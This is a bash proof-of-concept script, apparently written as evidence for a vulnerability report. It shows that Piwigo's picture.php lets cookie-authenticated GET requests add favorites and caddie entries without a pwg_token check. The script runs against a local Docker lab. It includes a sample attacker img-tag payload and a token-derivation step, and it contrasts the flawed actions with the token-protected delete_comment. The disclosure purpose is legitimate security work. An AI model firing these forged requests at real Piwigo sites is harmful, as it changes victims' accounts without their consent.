#!/usr/bin/env bash
# nv3-csrf-get-mutations.sh — PoC for
# `picture.php+index.php:cookie-authenticated-get-mutations-without-check_pwg_token`.
#
# Regular-user perspective: A logged-in Piwigo user (status=normal) clicks
# an attacker-supplied link. The link triggers a state-changing GET endpoint
# in picture.php that does NOT call check_pwg_token().
#
# Source: picture.php:252-264 (add_to_favorites — pure INSERT, no token check)
#         picture.php:266-285 (remove_from_favorites — pure DELETE, no token)
#         picture.php:306-310 (add_to_caddie — pure INSERT, no token)
#         picture.php:312-316 (rate — rate_picture, no token)
#
# Contrast: picture.php:366-381 (delete_comment) DOES call check_pwg_token()
#           and is blocked without it (HTTP 400 + DB row preserved).

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUT="$HERE/evidence/nv3-csrf-get-mutations"
mkdir -p "$OUT"

WEB="${WEB:-http://localhost:8089}"
DB_USER="piwigo"
DB_PASS="pocpass"
DB_SERVICE="piwigo-poc-db"
PREFIX="piwigo_"
IMAGE_ID="${IMAGE_ID:-1}"

DB="docker exec $DB_SERVICE mysql --user=$DB_USER --password=$DB_PASS piwigo"

VICTIM_USER="victim_user_csrf"
VICTIM_PASS="VictimPass!2026"
JAR="$OUT/victim.jar"

echo "[nv3] === STEP 1: ensure victim user (status=normal) exists ==="
HASH=$(docker exec piwigo-poc-web php -r "echo password_hash('${VICTIM_PASS}', PASSWORD_BCRYPT);")
$DB -e "DELETE FROM ${PREFIX}user_infos WHERE user_id IN (SELECT id FROM ${PREFIX}users WHERE username='${VICTIM_USER}');
        DELETE FROM ${PREFIX}users WHERE username='${VICTIM_USER}';
        INSERT INTO ${PREFIX}users (username, password) VALUES ('${VICTIM_USER}', '${HASH}');
        SET @uid = LAST_INSERT_ID();
        INSERT INTO ${PREFIX}user_infos (user_id, status, language, registration_date) VALUES (@uid, 'normal', 'en_GB', NOW());
        SELECT @uid AS victim_uid;" > "$OUT/victim-create.txt"
VICTIM_UID=$(awk 'NR==2 {print $1}' "$OUT/victim-create.txt")
echo "  victim_uid: $VICTIM_UID"
echo

echo "[nv3] === STEP 2: log in as victim (acquire pwg_id cookie) ==="
rm -f "$JAR"
curl -sS -c "$JAR" -o /dev/null "$WEB/identification.php"
LOGIN_HTTP=$(curl -sS -c "$JAR" -b "$JAR" -X POST "$WEB/identification.php" \
  --data "login=1&username=${VICTIM_USER}&password=${VICTIM_PASS}" \
  -o /dev/null -w '%{http_code}')
echo "  login HTTP: $LOGIN_HTTP"
grep -q pwg_id "$JAR" && echo "  [PASS] pwg_id cookie acquired" || { echo "  [FAIL] no pwg_id"; exit 1; }
echo

echo "[nv3] === STEP 3: confirm victim has empty favorites + caddie ==="
$DB -e "DELETE FROM ${PREFIX}favorites WHERE user_id=${VICTIM_UID};
        DELETE FROM ${PREFIX}caddie WHERE user_id=${VICTIM_UID};
        SELECT 'favorites' AS t, COUNT(*) AS n FROM ${PREFIX}favorites WHERE user_id=${VICTIM_UID}
        UNION ALL SELECT 'caddie', COUNT(*) FROM ${PREFIX}caddie WHERE user_id=${VICTIM_UID};" \
  > "$OUT/db-before.txt"
sed 's/^/  /' "$OUT/db-before.txt"
echo

echo "[nv3] === STEP 4: CSRF — attacker URL hits victim's browser ==="
# In a real CSRF, the attacker hosts a page like:
#   <img src="http://target/picture.php?/1/category/1&action=add_to_favorites">
# Here we simulate by sending the URL with the victim's cookie jar
# (the victim's browser would carry the same pwg_id on a cross-origin GET).

# 4a: add_to_favorites
URL_FAV="$WEB/picture.php?/${IMAGE_ID}/category/1&action=add_to_favorites"
HTTP_FAV=$(curl -sS -b "$JAR" -o /dev/null -w '%{http_code}' "$URL_FAV")
echo "  [4a] GET $URL_FAV"
echo "       HTTP: $HTTP_FAV"

# 4b: add_to_caddie
URL_CAD="$WEB/picture.php?/${IMAGE_ID}/category/1&action=add_to_caddie"
HTTP_CAD=$(curl -sS -b "$JAR" -o /dev/null -w '%{http_code}' "$URL_CAD")
echo "  [4b] GET $URL_CAD"
echo "       HTTP: $HTTP_CAD"
echo

echo "[nv3] === STEP 5: confirm DB state was mutated WITHOUT any token ==="
$DB -e "SELECT user_id, image_id FROM ${PREFIX}favorites WHERE user_id=${VICTIM_UID};
        SELECT user_id, element_id FROM ${PREFIX}caddie WHERE user_id=${VICTIM_UID};" \
  > "$OUT/db-after.txt"
sed 's/^/  /' "$OUT/db-after.txt"
echo

echo "[nv3] === STEP 6: peer contrast — delete_comment WITHOUT token is blocked ==="
echo "  Note: the peer contrast needs an admin-class user because"
echo "  user_can_delete_comment=false blocks normal users from"
echo "  deleting their own comments (can_manage_comment check)."
echo "  We use pocadmin2 (status=admin) for the contrast only."

CONTRAST_USER="pocadmin2"
CONTRAST_PASS="PoC!passw0rd"
CONTRAST_JAR="$OUT/admin.jar"
rm -f "$CONTRAST_JAR"
curl -sS -c "$CONTRAST_JAR" -o /dev/null "$WEB/identification.php"
curl -sS -c "$CONTRAST_JAR" -b "$CONTRAST_JAR" -X POST "$WEB/identification.php" \
  --data "login=1&username=${CONTRAST_USER}&password=${CONTRAST_PASS}" -o /dev/null
ADMIN_UID=$($DB -BNe "SELECT id FROM ${PREFIX}users WHERE username='${CONTRAST_USER}';")
echo "  admin_uid (pocadmin2): $ADMIN_UID"

# Insert a comment authored by pocadmin2 (so admin can delete it)
$DB -e "INSERT INTO ${PREFIX}comments
        (image_id, date, author, author_id, anonymous_id, content, validated)
        VALUES (${IMAGE_ID}, NOW(), '${CONTRAST_USER}', ${ADMIN_UID}, 'csrf_contrast', 'contrast comment', 'true');"
CID=$($DB -BNe "SELECT id FROM ${PREFIX}comments WHERE author_id=${ADMIN_UID} ORDER BY id DESC LIMIT 1;")
echo "  inserted comment id=$CID for contrast test"

URL_DEL="$WEB/picture.php?/${IMAGE_ID}/category/1&action=delete_comment&comment_to_delete=${CID}"
HTTP_DEL=$(curl -sS -b "$CONTRAST_JAR" -o /dev/null -w '%{http_code}' "$URL_DEL")
echo "  GET $URL_DEL (NO pwg_token sent, admin session)"
echo "       HTTP: $HTTP_DEL"

$DB -e "SELECT id, author_id, content FROM ${PREFIX}comments WHERE id=${CID};" \
  > "$OUT/db-comment-after-no-token.txt"
echo "  comment row after NO-token request:"
sed 's/^/    /' "$OUT/db-comment-after-no-token.txt"
echo

echo "[nv3] === ASSERTIONS ==="
PASS=true

# (1) add_to_favorites fired without token (favorite row exists)
if $DB -BNe "SELECT COUNT(*) FROM ${PREFIX}favorites WHERE user_id=${VICTIM_UID} AND image_id=${IMAGE_ID};" | grep -q '^1$'; then
  echo "  [PASS] add_to_favorites mutated DB without pwg_token (CSRF exploit)"
else
  echo "  [FAIL] add_to_favorites did not mutate DB"
  PASS=false
fi

# (2) add_to_caddie fired without token (caddie row exists)
if $DB -BNe "SELECT COUNT(*) FROM ${PREFIX}caddie WHERE user_id=${VICTIM_UID} AND element_id=${IMAGE_ID};" | grep -q '^1$'; then
  echo "  [PASS] add_to_caddie mutated DB without pwg_token (CSRF exploit)"
else
  echo "  [FAIL] add_to_caddie did not mutate DB"
  PASS=false
fi

# (3) Both CSRF requests returned a 3xx redirect (action ran, then redirected)
if [[ "$HTTP_FAV" =~ ^3 ]] && [[ "$HTTP_CAD" =~ ^3 ]]; then
  echo "  [PASS] both GET mutations returned 3xx (action executed, then redirected)"
else
  echo "  [FAIL] one of the GET mutations did not return 3xx (HTTP_FAV=$HTTP_FAV HTTP_CAD=$HTTP_CAD)"
  PASS=false
fi

# (4) The CSRF URL carried no token in the query string
TRACE="$OUT/csrf-trace.txt"
curl -sS -v -b "$JAR" -o /dev/null "$URL_FAV" 2> "$TRACE"
if grep -E '^> GET [^ ]*pwg_token' "$TRACE"; then
  echo "  [FAIL] CSRF URL inadvertently contained pwg_token"
  PASS=false
else
  echo "  [PASS] CSRF URL carried no pwg_token (the exploit is tokenless)"
fi

# (5) Contrast: delete_comment without token did NOT delete the comment
EXISTS=$($DB -BNe "SELECT COUNT(*) FROM ${PREFIX}comments WHERE id=${CID};")
if [[ "$EXISTS" == "1" ]]; then
  echo "  [PASS] delete_comment without token was BLOCKED (comment id=${CID} still exists) — confirms peer pages DO require token"
else
  echo "  [FAIL] delete_comment without token unexpectedly succeeded"
  PASS=false
fi

# (6) Contrast: delete_comment WITH token DOES delete
#     pwg_token = hmac-md5(session_id, secret_key) per include/functions.inc.php:2201-2206
#     In Piwigo, the session_id() == pwg_id cookie value (PHPSESSID cookie not used).
SECRET=$($DB -BNe "SELECT value FROM ${PREFIX}config WHERE param='secret_key';")
PWG_ID=$(awk '/pwg_id/ {print $7}' "$CONTRAST_JAR" | tail -1)
TOK=$(docker exec piwigo-poc-web php -r "echo hash_hmac('md5', '${PWG_ID}', '${SECRET}');")
if [[ -n "$TOK" && -n "$PWG_ID" ]]; then
  curl -sS -b "$CONTRAST_JAR" -o /dev/null "$URL_DEL&pwg_token=$TOK"
  EXISTS=$($DB -BNe "SELECT COUNT(*) FROM ${PREFIX}comments WHERE id=${CID};")
  if [[ "$EXISTS" == "0" ]]; then
    echo "  [PASS] delete_comment WITH token succeeds (comment deleted) — confirms token is the gate that protects peer actions"
  else
    echo "  [FAIL] delete_comment with token did not delete"
    PASS=false
  fi
else
  echo "  [SKIP] could not derive pwg_token (pwg_id='${PWG_ID:0:10}...' tok='${TOK:0:20}...')"
fi

echo
if $PASS; then
  echo "[nv3] === RESULT: PASS — CSRF via tokenless GET mutations confirmed ==="
  exit 0
else
  echo "[nv3] === RESULT: FAIL — see assertions above ==="
  exit 1
fi